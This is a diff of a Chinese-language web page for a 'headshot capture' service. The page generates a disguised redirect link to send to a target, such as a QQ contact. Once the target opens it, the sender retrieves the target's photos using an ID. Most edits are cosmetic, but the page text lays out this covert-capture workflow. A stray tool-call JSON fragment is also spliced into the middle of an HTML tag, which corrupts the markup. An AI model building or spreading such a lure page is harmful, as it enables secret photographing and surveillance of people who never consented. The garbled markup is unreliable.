@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html lang="zh-cn">
-
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -26,9 +25,10 @@
       var url = document.getElementById('myurl');
       var s_url = "https://mirror.xcadmin.com";
       if (myid.value == "" || url.value == "") {
-        swal("ID 或跳转地址不能为空！");
+        swal("ID或跳转地址不能为空！");
         return false;
       }
+      // 假设这里定义了str_encode函数，例如：
       function str_encode(str) {
         return encodeURIComponent(str);
       }
@@ -65,30 +65,24 @@
 
     window.onload = function () {
       gg();
-
-function showTime() {
-  var now = new Date();
-  var year = now.getFullYear();
-  var month = now.getMonth() + 1;
-  var day = now.getDate();
-  var hours = now.getHours();
-  var minutes = now.getMinutes();
-  var seconds = now.getSeconds();
-  var timeStr = year + '-' + (month < 10? '0' + month : month) + '-' + (day < 10? '0' + day : day) +' '+ (hours < 10? '0' + hours : hours) + ':' + (minutes < 10? '0' + minutes : minutes) + ':' + (seconds < 10? '0' + seconds : seconds);
-
-  var oldTimeDiv = document.getElementById('time-display');
-  if (oldTimeDiv) {
-    oldTimeDiv.parentNode.removeChild(oldTimeDiv);
-  }
-
-  var timeDiv = document.createElement('div');
-  timeDiv.id = 'time-display';
-  timeDiv.style.textAlign = 'center';
-  timeDiv.innerHTML = timeStr;
-  var authorDiv = document.querySelector('.alert.alert-info');
-  authorDiv.parentNode.insertBefore(timeDiv, authorDiv);
-}
-
+      // 新增时间显示函数
+      function showTime() {
+        var now = new Date();
+        var year = now.getFullYear();
+        var month = now.getMonth() + 1;
+        var day = now.getDate();
+        var hours = now.getHours();
+        var minutes = now.getMinutes();
+        var seconds = now.getSeconds();
+        var timeStr = year + '-' + (month < 10? '0' + month : month) + '-' + (day < 10? '0' + day : day) +' '+ (hours < 10? '0' + hours : hours) + ':' + (minutes < 10? '0' + minutes : minutes) + ':' + (seconds < 10? '0' + seconds : seconds);
+        var timeDiv = document.createElement('div');
+        timeDiv.style.textAlign = 'center';
+        timeDiv.innerHTML = timeStr;
+        var authorDiv = document.querySelector('.alert.alert-info');
+        authorDiv.parentNode.insertBefore(timeDiv, authorDiv);
+      }
+      showTime();
+    }
   </script>
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-RT13NSRESZ"></script>
   <script>
@@ -98,7 +92,6 @@ function showTime() {
     gtag('config', 'G-RT13NSRESZ');
   </script>
 </head>
-
 <body background="https://s2.loli.net/2025/01/12/rIXQz61nf3RVvpt.jpg" style="background-repeat:no-repeat; background-size:100% 100%; background-attachment:fixed;">
   <div class="container">
     <div class="col-xs-12 col-sm-10 col-md-8 col-lg-6 center-block" style="float: none;">
@@ -107,19 +100,19 @@ function showTime() {
         <div class="panel-heading" style="background: linear-gradient(to right, #b221ff, #b7ff14, #8ae68a);">
           <center><h3 class="panel-title">大头照获取</h3></center>
         </div>
-        <div class="panel-body" style="text-align: center;">
+        <div class�{"name":"GodelPlugin","parameters":{"input":"div class="panel-body" style="text-align: center;">
           <div class="list-group">
             <div class="list-group-item list-group-item-warning" style="font-weight: bold;">
               <span>使用教程</span>
             </div>
             <div class="list-group-item list-group-item-info" style="font-weight: bold;">
-              <input class="form-control" type="text" id="myid" placeholder="请输入 ID（后续查看照片凭证）" value='' />
+              <input class="form-control" type="text" id="myid" placeholder="请输入ID（后续查看照片凭证）" value='' />
             </div>
             <div class="list-group-item list-group-item-info" style="font-weight: bold;">
               <input class="form-control" type="text" id="myurl" placeholder="请输入跳转地址，例：https://www.baidu.com" value='' />
             </div>
             <div class="list-group-item list-group-item-warning" style="font-weight: bold;">
-              <span><a id="kd" style="pointer-events: none;">先【生成链接】，对方打开链接后凭 ID 可【查看照片】！</a></span>
+              <span><a id="kd" style="pointer-events: none;">先【生成链接】，对方打开链接后凭ID可【查看照片】！</a></span>
             </div>
             <div class="list-group-item">
               <a onclick='create();' class="btn btn-block btn-primary" style="background: linear-gradient(to right, #b221ff, #14b7ff);">生成链接</a>
@@ -147,10 +140,10 @@ function showTime() {
           <br>2.凭证是查看照片的凭证,不要泄露给知道这个平台的人
           <br>3.如有侵权、肖像权等,请联系本站下方客服删除！
           <br>使用说明:
-          <br>1.填写对方 QQ 或自己知道的数字+英文字母方便日后查询!填写完成后不用管直接点击生成!
+          <br>1.填写对方QQ或自己知道的数字+英文字母方便日后查询!填写完成后不用管直接点击生成!
           <br>2.生成完成后,复制链接(短地址)或二维码发给你要查询的人
-          <br>3.他点开后,然后回到本站,填写对方 QQ,然后点击查看照片即可！
-          <br>4.由于系统安全机制，ios 系统必须使用自带的 Safari 浏览器（或者第三方 APP 调用的是 Safari 内核）才行
+          <br>3.他点开后,然后回到本站,填写对方QQ,然后点击查看照片即可！
+          <br>4.由于系统安全机制，ios系统必须使用自带的Safari浏览器（或者第三方APP调用的是Safari内核）才行
           <br>仅供娱乐使用,请勿用于非法商业用途,否则后果自负！
           <br>站长邮箱:syteamq311@gmail.com
           <br>本站由日月星辰工作室（FY STUDIO）提供技术支持
@@ -159,5 +152,4 @@ function showTime() {
     </div>
   </div>
 </body>
-
 </html>
